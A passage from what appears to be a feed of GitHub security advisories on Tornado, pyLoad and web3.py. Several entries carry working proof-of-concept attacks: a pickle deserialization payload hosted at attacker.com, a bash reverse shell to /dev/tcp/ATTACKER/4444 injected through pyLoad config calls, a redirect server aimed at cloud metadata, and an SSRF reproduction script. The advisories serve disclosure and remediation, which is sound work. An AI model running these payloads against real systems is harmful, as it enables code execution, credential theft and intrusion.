            <uri>https://github.com/advisories/GHSA-3h9h-qfvw-98hq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-06T17:51:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado has cookie attribute injection via .RequestHandler.set_cookie]]></title>
        <id>https://github.com/advisories/GHSA-fqwm-6jpj-5wxc</id>
        <link href="https://github.com/advisories/GHSA-fqwm-6jpj-5wxc"/>
        <updated>2026-04-04T06:45:03.000Z</updated>
        <content type="html"><![CDATA[<p>In Tornado before 6.5.5, cookie attribute injection could occur because the domain, path, and samesite arguments to <code>.RequestHandler.set_cookie</code> were not checked for crafted characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7">https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35536">https://nvd.nist.gov/vuln/detail/CVE-2026-35536</a></li>
<li><a href="https://github.com/tornadoweb/tornado/releases/tag/v6.5.5">https://github.com/tornadoweb/tornado/releases/tag/v6.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-fqwm-6jpj-5wxc">https://github.com/advisories/GHSA-fqwm-6jpj-5wxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqwm-6jpj-5wxc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T06:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad: Unprotected storage_folder enables arbitrary file write to Flask session store and code execution (Incomplete fix for CVE-2026-33509)]]></title>
        <id>https://github.com/advisories/GHSA-4744-96p5-mp2j</id>
        <link href="https://github.com/advisories/GHSA-4744-96p5-mp2j"/>
        <updated>2026-04-04T06:43:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for CVE-2026-33509 (GHSA-r7mc-x6x7-cqxx) added an <code>ADMIN_ONLY_OPTIONS</code> set to block non-admin users from modifying security-critical config options. The <code>storage_folder</code> option is not in this set and passes the existing path restriction because the Flask session directory is outside both PKGDIR and userdir. A user with SETTINGS and ADD permissions can redirect downloads to the Flask filesystem session store, plant a malicious pickle payload as a predictable session file, and trigger arbitrary code execution when any HTTP request arrives with the corresponding session cookie.</p>
<h2 id="required-privileges">Required Privileges</h2>
<p>The chain requires a single non-admin user with both <code>SETTINGS</code> (to change <code>storage_folder</code>) and <code>ADD</code> (to submit a download URL) permissions. These are independent bitmask flags that can be assigned together by an admin. The final RCE trigger is unauthenticated: any HTTP request with the crafted session cookie causes deserialization.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>storage_folder</code> at <code>src/pyload/core/api/__init__.py:238-246</code> has a path check that blocks writing inside PKGDIR or userdir using <code>os.path.realpath</code>. However, Flask's filesystem session directory (<code>/tmp/pyLoad/flask/</code> in the standard Docker deployment) is outside both restricted paths.</p>
<p>pyload configures Flask with <code>SESSION_TYPE = "filesystem"</code> at <code>__init__.py:127</code>. The cachelib <code>FileSystemCache</code> stores session files as <code>md5("session:" + session_id)</code> and deserializes them with <code>pickle.load()</code> on every request that carries the corresponding session cookie.</p>
<h2 id="proven-rce-chain">Proven RCE Chain</h2>
<p>Tested against <code>lscr.io/linuxserver/pyload-ng:latest</code> Docker image.</p>
<p><strong>Step 1</strong> — Change download directory to Flask session store:</p>
<pre><code>POST /api/set_config_value
{"section":"core","category":"general","option":"storage_folder","value":"/tmp/pyLoad/flask"}
</code></pre>
<p>The path check resolves <code>/tmp/pyLoad/flask/</code> via <code>realpath</code>. It does not start with PKGDIR (<code>/lsiopy/.../pyload/</code>) or userdir (<code>/config/</code>). Check passes.</p>
<p><strong>Step 2</strong> — Compute the target session filename:</p>
<pre><code>md5("session:ATTACKER_SESSION_ID") = 92912f771df217fb6fbfded6705dd47c
</code></pre>
<p>Flask-Session uses cachelib which stores files as <code>md5(key_prefix + session_id)</code>. The default key prefix is <code>session:</code>.</p>
<p><strong>Step 3</strong> — Host and download the malicious pickle payload:</p>
<pre><code>import pickle, os, struct
class RCE:
    def __reduce__(self):
        return (os.system, ("id &gt; /tmp/pyload-rce-success",))
session = {"_permanent": True, "rce": RCE()}
payload = struct.pack("I", 0) + pickle.dumps(session, protocol=2)
# struct.pack("I", 0) = cachelib timeout header (0 = never expires)
</code></pre>
<p>Serve as <code>http://attacker.com/92912f771df217fb6fbfded6705dd47c</code> and submit:</p>
<pre><code>POST /api/add_package
{"name":"x","links":["http://attacker.com/92912f771df217fb6fbfded6705dd47c"],"dest":1}
</code></pre>
<p>The file is saved to <code>/tmp/pyLoad/flask/92912f771df217fb6fbfded6705dd47c</code>.</p>
<p><strong>Step 4</strong> — Trigger deserialization (unauthenticated):</p>
<pre><code>curl http://target:8000/ -b "pyload_session_8000=ATTACKER_SESSION_ID"
</code></pre>
<p>The session cookie name is <code>pyload_session_</code> + the configured port number (<code>__init__.py:128</code>).</p>
<p>Flask loads the session file. cachelib reads the 4-byte timeout header, confirms the entry is not expired, and calls <code>pickle.load()</code>. The RCE gadget executes.</p>
<p><strong>Result</strong>:</p>
<pre><code>$ docker exec pyload-poc cat /tmp/pyload-rce-success
uid=1000(abc) gid=1000(users) groups=1000(users)
</code></pre>
<h2 id="impact">Impact</h2>
<p>A non-admin user with SETTINGS + ADD permissions achieves arbitrary code execution as the pyload service user. The final trigger requires no authentication. The attacker can:</p>
<ul>
<li>Execute arbitrary commands with the privileges of the pyload process</li>
<li>Read environment variables (API keys, credentials)</li>
<li>Access the filesystem (download history, user database)</li>
<li>Pivot to other network resources</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add <code>storage_folder</code> to the ADMIN_ONLY set, or extend the path check to block writing to auto-consumed temporary directories (Flask session store, Jinja bytecode cache, pyload temp directory):</p>
<pre><code>ADMIN_ONLY_OPTIONS = {
    ...
    ("general", "storage_folder"),  # ADDED: prevents session poisoning RCE
    ...
}
</code></pre>
<p>Also correct the existing wrong option names:</p>
<pre><code>("webui", "ssl_certfile"),  # FIXED: was "ssl_cert" (dead code)
("webui", "ssl_keyfile"),   # FIXED: was "ssl_key" (dead code)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-4744-96p5-mp2j">https://github.com/pyload/pyload/security/advisories/GHSA-4744-96p5-mp2j</a></li>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx">https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33509">https://nvd.nist.gov/vuln/detail/CVE-2026-33509</a></li>
<li><a href="https://github.com/advisories/GHSA-4744-96p5-mp2j">https://github.com/advisories/GHSA-4744-96p5-mp2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4744-96p5-mp2j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-04T06:43:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad: Improper Neutralization of Special Elements used in an OS Command]]></title>
        <id>https://github.com/advisories/GHSA-w48f-wwwf-f5fr</id>
        <link href="https://github.com/advisories/GHSA-w48f-wwwf-f5fr"/>
        <updated>2026-04-04T06:42:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>ADMIN_ONLY_OPTIONS</code> protection mechanism restricts security-critical configuration values (reconnect scripts, SSL certs, proxy credentials) to admin-only access. However, this protection is <strong>only applied to core config options</strong>, not to plugin config options. The <code>AntiVirus</code> plugin stores an executable path (<code>avfile</code>) in its config, which is passed directly to <code>subprocess.Popen()</code>. A non-admin user with SETTINGS permission can change this path to achieve remote code execution.</p>
<h3 id="details">Details</h3>
<p><strong>Safe wrapper — <code>ADMIN_ONLY_OPTIONS</code> (core/api/<strong>init</strong>.py:225-235):</strong></p>
<pre><code class="language-python">ADMIN_ONLY_OPTIONS = {
    "reconnect.script",      # Blocks script path change
    "webui.host",            # Blocks bind address change
    "ssl.cert_file",         # Blocks cert path change
    "ssl.key_file",          # Blocks key path change
    # ... other sensitive options
}
</code></pre>
<p><strong>Where it IS enforced — core config (core/api/<strong>init</strong>.py:255):</strong></p>
<pre><code class="language-python">def set_config_value(self, section, option, value):
    if f"{section}.{option}" in ADMIN_ONLY_OPTIONS:
        if not self.user.is_admin:
            raise PermissionError("Admin only")
    # ...
</code></pre>
<p><strong>Where it is NOT enforced — plugin config (core/api/<strong>init</strong>.py:271-272):</strong></p>
<pre><code class="language-python">    # Plugin config - NO admin check at all
    self.pyload.config.set_plugin(category, option, value)
</code></pre>
<p><strong>Dangerous sink — AntiVirus plugin (plugins/addons/AntiVirus.py:75):</strong></p>
<pre><code class="language-python">def scan_file(self, file):
    avfile = self.config.get("avfile")    # User-controlled via plugin config
    avargs = self.config.get("avargs")
    subprocess.Popen([avfile, avargs, target])  # RCE
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># As non-admin user with SETTINGS permission:

# 1. Set AntiVirus executable to a reverse shell
curl -b session_cookie -X POST http://TARGET:8000/api/set_config_value \
  -d 'section=plugin' \
  -d 'option=AntiVirus.avfile' \
  -d 'value=/bin/bash'

curl -b session_cookie -X POST http://TARGET:8000/api/set_config_value \
  -d 'section=plugin' \
  -d 'option=AntiVirus.avargs' \
  -d 'value=-c "bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1"'

# 2. Enable the AntiVirus plugin
curl -b session_cookie -X POST http://TARGET:8000/api/set_config_value \
  -d 'section=plugin' \
  -d 'option=AntiVirus.activated' \
  -d 'value=True'

# 3. Add a download - when it completes, AntiVirus.scan_file() runs the payload
curl -b session_cookie -X POST http://TARGET:8000/api/add_package \
  -d 'name=test' \
  -d 'links=http://example.com/test.zip'

# Result: reverse shell as the pyload process user
</code></pre>
<h3 id="additional-finding-arbitrary-file-read-via-storage_folder">Additional Finding: Arbitrary File Read via storage_folder</h3>
<p>The <code>storage_folder</code> validation at <code>core/api/__init__.py:238-246</code> uses inverted logic — it prevents the new value from being INSIDE protected directories, but not from being an ANCESTOR of everything. Setting <code>storage_folder=/</code> combined with <code>GET /files/get/etc/passwd</code> gives arbitrary file read to non-admin users with SETTINGS+DOWNLOAD permissions.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Remote Code Execution</strong> — Non-admin user can execute arbitrary commands via AntiVirus plugin config</li>
<li><strong>Privilege escalation</strong> — SETTINGS permission (non-admin) escalates to full system access</li>
<li><strong>Arbitrary file read</strong> — Via storage_folder manipulation</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>Apply <code>ADMIN_ONLY_OPTIONS</code> to plugin config as well:</p>
<pre><code class="language-python"># In set_config_value():
ADMIN_ONLY_PLUGIN_OPTIONS = {
    "AntiVirus.avfile",
    "AntiVirus.avargs",
    # ... any plugin option that controls executables or paths
}

if section == "plugin" and option in ADMIN_ONLY_PLUGIN_OPTIONS:
    if not self.user.is_admin:
        raise PermissionError("Admin only")
</code></pre>
<p>Or better: validate that <code>avfile</code> points to a known AV binary before passing to <code>subprocess.Popen()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-w48f-wwwf-f5fr">https://github.com/pyload/pyload/security/advisories/GHSA-w48f-wwwf-f5fr</a></li>
<li><a href="https://github.com/advisories/GHSA-w48f-wwwf-f5fr">https://github.com/advisories/GHSA-w48f-wwwf-f5fr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w48f-wwwf-f5fr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-04T06:41:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyLoad: SSRF filter bypass via HTTP redirect in BaseDownloader (Incomplete fix for CVE-2026-33992)]]></title>
        <id>https://github.com/advisories/GHSA-7gvf-3w72-p2pg</id>
        <link href="https://github.com/advisories/GHSA-7gvf-3w72-p2pg"/>
        <updated>2026-04-04T06:41:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for CVE-2026-33992 (GHSA-m74m-f7cr-432x) added IP validation to <code>BaseDownloader.download()</code> that checks the hostname of the initial download URL. However, pycurl is configured with <code>FOLLOWLOCATION=1</code> and <code>MAXREDIRS=10</code>, causing it to automatically follow HTTP redirects. Redirect targets are never validated against the SSRF filter.</p>
<p>An authenticated user with ADD permission can bypass the SSRF fix by submitting a URL that redirects to an internal address.</p>
<h2 id="root-cause">Root Cause</h2>
<p>The SSRF check at <code>src/pyload/plugins/base/downloader.py:335-341</code> validates only the initial URL:</p>
<pre><code>dl_hostname = urllib.parse.urlparse(dl_url).hostname
if is_ip_address(dl_hostname) and not is_global_address(dl_hostname):
    self.fail(...)
else:
    for ip in host_to_ip(dl_hostname):
        if not is_global_address(ip):
            self.fail(...)
</code></pre>
<p>After the check passes, <code>_download()</code> is called. pycurl is configured at <code>src/pyload/core/network/http/http_request.py:114-115</code> to follow redirects:</p>
<pre><code>self.c.setopt(pycurl.FOLLOWLOCATION, 1)
self.c.setopt(pycurl.MAXREDIRS, 10)
</code></pre>
<p>No <code>CURLOPT_REDIR_PROTOCOLS</code> restriction is set anywhere in HTTPRequest. Redirect targets bypass the SSRF filter entirely.</p>
<h2 id="poc">PoC</h2>
<p>Redirect server (attacker-controlled):</p>
<pre><code>from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://169.254.169.254/metadata/v1.json")
        self.end_headers()

HTTPServer(("0.0.0.0", 8888), RedirectHandler).serve_forever()
</code></pre>
<p>Submit to pyload (requires ADD permission):</p>
<pre><code>curl -b cookies.txt -X POST 'http://target:8000/json/add_package' \
  -d 'add_name=ssrf-test&amp;add_dest=1&amp;add_links=http://attacker.com:8888/redirect'
</code></pre>
<p>The SSRF check resolves <code>attacker.com</code> to a public IP and passes. pycurl follows the 302 redirect to <code>http://169.254.169.254/metadata/v1.json</code> without validation. Cloud metadata is downloaded and saved to the storage folder.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated user with ADD permission can access:</p>
<ul>
<li>Cloud metadata endpoints (169.254.169.254) for AWS, GCP, DigitalOcean, Azure — including IAM credentials and instance identity</li>
<li>Internal network services (10.x, 172.16.x, 192.168.x)</li>
<li>Localhost services (127.0.0.1)</li>
</ul>
<p>This is the same impact as CVE-2026-33992 (rated Critical), achieved through a single redirect hop. The severity is reduced from Critical to High because authentication with ADD permission is now required.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Disable automatic redirect following and validate each redirect target:</p>
<pre><code># In HTTPRequest.__init__():
self.c.setopt(pycurl.FOLLOWLOCATION, 0)
</code></pre>
<p>Then implement manual redirect following in the download logic with SSRF validation at each hop. Alternatively, restrict redirect protocols:</p>
<pre><code>self.c.setopt(pycurl.REDIR_PROTOCOLS, pycurl.PROTO_HTTP | pycurl.PROTO_HTTPS)
</code></pre>
<p>And add a pycurl callback to validate redirect destination IPs before following.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>CVE-2026-33992 / GHSA-m74m-f7cr-432x: Original SSRF (Critical, unauthenticated). This bypass requires ADD permission.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-7gvf-3w72-p2pg">https://github.com/pyload/pyload/security/advisories/GHSA-7gvf-3w72-p2pg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33992">https://nvd.nist.gov/vuln/detail/CVE-2026-33992</a></li>
<li><a href="https://github.com/advisories/GHSA-7gvf-3w72-p2pg">https://github.com/advisories/GHSA-7gvf-3w72-p2pg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gvf-3w72-p2pg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-04T06:41:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[web3] web3.py: SSRF via CCIP Read (EIP-3668) OffchainLookup URL handling]]></title>
        <id>https://github.com/advisories/GHSA-5hr4-253g-cpx2</id>
        <link href="https://github.com/advisories/GHSA-5hr4-253g-cpx2"/>
        <updated>2026-04-04T06:38:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>web3.py implements CCIP Read / <code>OffchainLookup</code> (EIP-3668) by performing HTTP requests to URLs supplied by smart contracts in <code>offchain_lookup_payload["urls"]</code>. The implementation uses these contract-supplied URLs directly (after <code>{sender}</code> / <code>{data}</code> template substitution) without any destination validation:</p>
<ul>
<li>No restriction to <code>https://</code> (and no opt-in gate for <code>http://</code>)</li>
<li>No hostname or IP allowlist</li>
<li>No blocking of private/reserved IP ranges (loopback, link-local, RFC1918)</li>
<li>No redirect target validation (both <code>requests</code> and <code>aiohttp</code> follow redirects by default)</li>
</ul>
<p><strong>CCIP Read is enabled by default</strong> (<code>global_ccip_read_enabled = True</code> on all providers), meaning any application using web3.py's <code>.call()</code> method is exposed without explicit opt-in.</p>
<p>This results in <strong>Server-Side Request Forgery (SSRF)</strong> when web3.py is used in backend services, indexers, APIs, or any environment that performs <code>eth_call</code> / <code>.call()</code> against untrusted or user-supplied contract addresses. A malicious contract can force the web3.py process to issue HTTP requests to arbitrary destinations, including internal network services and cloud metadata endpoints.</p>
<hr>
<h2 id="why-this-is-a-vulnerability">Why This Is a Vulnerability</h2>
<p>The argument is not that CCIP Read itself is invalid or that web3.py should stop supporting EIP-3668. The issue is that, in server-side deployments (backends, indexers, bots, APIs), the current implementation doesn't provide destination policy controls, such as a validation/override hook, private-range blocking, or redirect target checks, which means contract controlled CCIP URLs can be used as an SSRF primitive.</p>
<p>This is consistent with EIP-3668's own security considerations, which recommends that client libraries "provide clients with a hook to override CCIP read calls, either by rewriting them to use a proxy service, or by denying them entirely" and that "this mechanism or another should be written so as to easily facilitate adding domains to allowlists or blocklists." The mitigations I'm suggesting are meant to align with that guidance without breaking CCIP Read support.</p>
<ul>
<li><p><strong>Default-on exposure.</strong> CCIP Read is enabled by default on all web3.py providers (<code>global_ccip_read_enabled = True</code>). Users who never intend to use CCIP Read, and who may not even know the feature exists, are silently exposed. A feature that makes unsanitized outbound requests to attacker-controlled URLs should not be enabled by default without safety guardrails.</p>
</li>
<li><p><strong>Library vs. application responsibility.</strong> web3.py is a widely-used library. Expecting every downstream application to independently implement SSRF protections around <code>.call()</code> is unreasonable, especially for a feature that fires automatically and invisibly on a specific revert pattern. Safe defaults at the library level are the standard expectation for any library that issues outbound HTTP requests to externally-controlled URLs.</p>
</li>
</ul>
<hr>
<h2 id="affected-code">Affected Code</h2>
<h3 id="sync-ccip-handler">Sync CCIP handler</h3>
<p><strong>File:</strong> <code>web3/utils/exception_handling.py</code> (lines 42-58)</p>
<p>Contract-controlled URLs are requested via <code>requests</code> with no destination validation:</p>
<pre><code class="language-python">session = requests.Session()
for url in offchain_lookup_payload["urls"]:
    formatted_url = URI(
        str(url)
        .replace("{sender}", str(formatted_sender))
        .replace("{data}", str(formatted_data))
    )

    try:
        if "{data}" in url and "{sender}" in url:
            response = session.get(formatted_url, timeout=DEFAULT_HTTP_TIMEOUT)
        else:
            response = session.post(
                formatted_url,
                json={"data": formatted_data, "sender": formatted_sender},
                timeout=DEFAULT_HTTP_TIMEOUT,
            )
</code></pre>
<p>(The request is issued before response validation; subsequent logic parses JSON and enforces a <code>"data"</code> field.)</p>
<p>Key observations:</p>
<ul>
<li><code>requests</code> follows redirects by default (<code>allow_redirects=True</code>).</li>
<li>No <code>allow_redirects=False</code> is set.</li>
<li>No validation of <code>formatted_url</code> before the request.</li>
<li>The placeholder check (<code>if "{data}" in url</code>) operates on the raw <code>url</code> value from the payload (before <code>str()</code> conversion), not on the already-formatted <code>formatted_url</code>. If <code>url</code> is not a plain <code>str</code> (e.g., a <code>URI</code> type), the <code>in</code> check may behave differently than intended.</li>
</ul>
<h3 id="async-ccip-handler">Async CCIP handler</h3>
<p><strong>File:</strong> <code>web3/utils/async_exception_handling.py</code> (lines 45-63)</p>
<p>Same pattern with <code>aiohttp</code>:</p>
<pre><code class="language-python">session = ClientSession()
for url in offchain_lookup_payload["urls"]:
    formatted_url = URI(
        str(url)
        .replace("{sender}", str(formatted_sender))
        .replace("{data}", str(formatted_data))
    )

    try:
        if "{data}" in url and "{sender}" in url:
            response = await session.get(
                formatted_url, timeout=ClientTimeout(DEFAULT_HTTP_TIMEOUT)
            )
        else:
            response = await session.post(
                formatted_url,
                json={"data": formatted_data, "sender": formatted_sender},
                timeout=ClientTimeout(DEFAULT_HTTP_TIMEOUT),
            )
</code></pre>
<p>Key observations:</p>
<ul>
<li><code>aiohttp</code> follows redirects by default.</li>
<li>No redirect or destination validation.</li>
<li>Same raw-<code>url</code> placeholder check issue as the sync handler.</li>
</ul>
<h3 id="default-on-invocation-path">Default-on invocation path</h3>
<p><strong>File:</strong> <code>web3/providers/base.py</code> (line 66) and <code>web3/providers/async_base.py</code> (line 79):</p>
<pre><code class="language-python">global_ccip_read_enabled: bool = True
</code></pre>
<p><strong>File:</strong> <code>web3/eth/eth.py</code> (lines 222-266) and <code>web3/eth/async_eth.py</code> (lines 243-287):</p>
<p>The <code>.call()</code> method automatically invokes <code>handle_offchain_lookup()</code> / <code>async_handle_offchain_lookup()</code> when a contract reverts with <code>OffchainLookup</code>, up to <code>ccip_read_max_redirects</code> times (default: 4). No user interaction or explicit opt-in is required beyond the default configuration.</p>
<hr>
<h2 id="security-impact">Security Impact</h2>
<h3 id="1-blind-ssrf-primary-impact">1. Blind SSRF (Primary Impact)</h3>
<p>A malicious contract can supply URLs that cause the web3.py process to issue HTTP GET or POST requests to:</p>
<ul>
<li><strong>Loopback services:</strong> <code>http://127.0.0.1:&lt;port&gt;/...</code>, <code>http://localhost/...</code></li>
<li><strong>Cloud metadata endpoints:</strong> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
<li><strong>Internal network services:</strong> any RFC1918 address (<code>10.x.x.x</code>, <code>172.16-31.x.x</code>, <code>192.168.x.x</code>)</li>
<li><strong>Arbitrary external destinations</strong></li>
</ul>
<p>The request is made from the web3.py process. This alone constitutes SSRF -- the attacker controls the destination of an outbound request from the victim's infrastructure.</p>
<p><strong>Note on response handling:</strong> The CCIP handler expects a JSON response containing a <code>"data"</code> field. If the target endpoint does not return valid JSON with this key, the handler raises <code>Web3ValidationError</code> or continues to the next URL. This means:</p>
<ul>
<li>The raw response body is <strong>not</strong> directly returned to the attacker in most cases (blind SSRF).</li>
<li>However, the request itself is the primary threat: it can reach internal services, trigger side effects on internal APIs, and serve as a network probe.</li>
<li>On AWS with IMDSv1, a GET to <code>http://169.254.169.254/...</code> returns credentials in plaintext. While the CCIP handler would fail to parse this as JSON, the request itself reaches the metadata service. If an internal endpoint returns JSON containing a <code>"data"</code> field (or can be coerced to), the handler may accept it and use it in the on-chain callback, creating a potential exfiltration path.</li>
</ul>
<h3 id="2-redirect-based-ssrf-amplification">2. Redirect-Based SSRF Amplification</h3>
<p>Both <code>requests</code> and <code>aiohttp</code> follow HTTP redirects by default. The CCIP handlers use the final response without validating the final resolved URL.</p>
<ul>
<li><strong>Sync:</strong> <code>web3/utils/exception_handling.py</code> -- <code>session.get()</code> with default <code>allow_redirects=True</code></li>
<li><strong>Async:</strong> <code>web3/utils/async_exception_handling.py</code> -- <code>session.get()</code> with default redirect following</li>
</ul>
<p>A contract-supplied URL can point to an attacker-controlled server that issues a <code>302</code> redirect to <code>http://169.254.169.254/...</code> or any internal endpoint. This defeats naive URL-prefix checks that an application might add, expanding the SSRF surface.</p>
<h3 id="3-internal-network-probing">3. Internal Network Probing</h3>
<p>By varying the URLs supplied in the <code>OffchainLookup</code> revert payload, an attacker can:</p>
<ul>
<li>Probe internal network topology (open ports, reachable hosts) based on response timing and error behavior</li>
<li>Trigger side effects on internal APIs that accept GET or POST requests without authentication</li>
<li>Map cloud infrastructure by querying metadata endpoints</li>
</ul>
<h3 id="4-post-based-ssrf">4. POST-Based SSRF</h3>
<p>When the contract-supplied URL does <strong>not</strong> contain both <code>{sender}</code> and <code>{data}</code> placeholders, the handler switches to <code>session.post()</code> with a JSON body. This means the attacker can cause the victim to issue <strong>POST requests with a controlled JSON body</strong> (<code>{"data": ..., "sender": ...}</code>) to arbitrary destinations, increasing the potential for triggering state-changing operations on internal services.</p>
<hr>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>Python environment with <code>web3</code> installed</li>
<li>No network access or blockchain connection required (the PoC calls the handler function directly)</li>
</ul>
<h3 id="step-1-start-a-local-http-listener">Step 1: Start a local HTTP listener</h3>
<pre><code class="language-bash">python -m http.server 9999
</code></pre>
<h3 id="step-2-run-the-reproduction-script">Step 2: Run the reproduction script</h3>
<pre><code class="language-bash">python repro_ssrf.py
</code></pre>
<h3 id="step-3-observe">Step 3: Observe</h3>
<p>The HTTP server logs will show an inbound request to a path like <code>/SSRF_DETECTION_SUCCESS?sender=...&amp;data=...</code>, confirming that <code>handle_offchain_lookup()</code> issued an outbound HTTP request to the contract-supplied URL without any destination validation.</p>
<p>The script will then print an error (the local HTTP server does not return the expected JSON), but the request has already been sent -- the SSRF occurs before any response validation.</p>
<h3 id="reproduction-script-repro_ssrfpy">Reproduction script (<code>repro_ssrf.py</code>)</h3>
<pre><code class="language-python">from web3.types import TxParams
from web3.utils.exception_handling import handle_offchain_lookup


def reproduce_ssrf():
    target_address = "0x0000000000000000000000000000000000000001"

    payload = {
        "sender": target_address,
        "callData": "0x1234",
        "callbackFunction": "0x12345678",
        "extraData": "0x90ab",
        "urls": [
            "http://127.0.0.1:9999/SSRF_DETECTION_SUCCESS?sender={sender}&amp;data={data}"
        ],
    }

    transaction: TxParams = {"to": target_address}

    print(f"Triggering CCIP Read handler with URL: {payload['urls'][0]}")

    try:
        handle_offchain_lookup(payload, transaction)
    except Exception as e:
        print(f"Expected failure after request was sent: {e}")


if __name__ == "__main__":
    reproduce_ssrf()
</code></pre>
<h3 id="real-world-attack-scenario">Real-world attack scenario</h3>
<p>In a production setting, the attacker would:</p>
<ol>
<li>Deploy a malicious contract that reverts with <code>OffchainLookup</code>, supplying URLs pointing to internal services (e.g., <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>).</li>
<li>Cause a backend service (indexer, API, bot) to call that contract via <code>eth_call</code> / <code>.call()</code>.</li>
<li>web3.py automatically triggers CCIP Read, issuing the HTTP request from the backend's network context.</li>
</ol>
<p>No special permissions or contract interactions beyond a standard <code>eth_call</code> are required.</p>
<hr>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<h3 id="1-restrict-url-schemes-safe-default">1. Restrict URL schemes (safe default)</h3>
<p>Allow only <code>https://</code> by default. Provide an explicit opt-in flag (e.g., <code>ccip_read_allow_http=True</code>) for <code>http://</code>.</p>
<h3 id="2-block-privatereserved-ip-destinations-by-default">2. Block private/reserved IP destinations by default</h3>
<p>Before issuing the request, resolve the hostname and reject connections to:</p>
<ul>
<li><code>127.0.0.0/8</code> (loopback)</li>
<li><code>169.254.0.0/16</code> (link-local / cloud metadata)</li>
<li><code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code> (RFC1918)</li>
<li><code>::1</code>, <code>fe80::/10</code> (IPv6 loopback / link-local)</li>
<li><code>0.0.0.0/8</code></li>
</ul>
<h3 id="3-disable-or-validate-redirects">3. Disable or validate redirects</h3>
<p>Either:</p>
<ul>
<li>Set <code>allow_redirects=False</code> on the HTTP requests, or</li>
<li>Validate each redirect target against the same destination policy before following it</li>
</ul>
<h3 id="4-provide-a-url-validator-hook">4. Provide a URL validator hook</h3>
<p>Allow users to supply a custom URL validation callback for CCIP Read URLs (e.g., a hostname allowlist, gateway pinning, or custom policy). This enables advanced users to configure CCIP Read for their specific trust model.</p>
<h3 id="5-consider-stronger-default-safety-signaling-or-default-off-in-server-side-contexts">5. Consider stronger default safety signaling (or default-off in server-side contexts)</h3>
<p>EIP-3668 encourages keeping CCIP Read enabled for calls, so this may not be desirable as a universal default change. However, for server-side deployments, consider either:</p>
<ul>
<li>a clearly documented “safe mode” preset (destination validation + redirect checks + private-range blocking), or</li>
<li>stronger warnings / examples showing how to disable CCIP Read (<code>ccip_read_enabled=False</code> or <code>global_ccip_read_enabled=False</code>) when calling untrusted contracts.</li>
</ul>
<p>At minimum, document the SSRF risk prominently in the CCIP Read docs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethereum/web3.py/security/advisories/GHSA-5hr4-253g-cpx2">https://github.com/ethereum/web3.py/security/advisories/GHSA-5hr4-253g-cpx2</a></li>
<li><a href="https://github.com/advisories/GHSA-5hr4-253g-cpx2">https://github.com/advisories/GHSA-5hr4-253g-cpx2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hr4-253g-cpx2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-04T06:38:11.000Z</published>
    </entry>
    <entry>
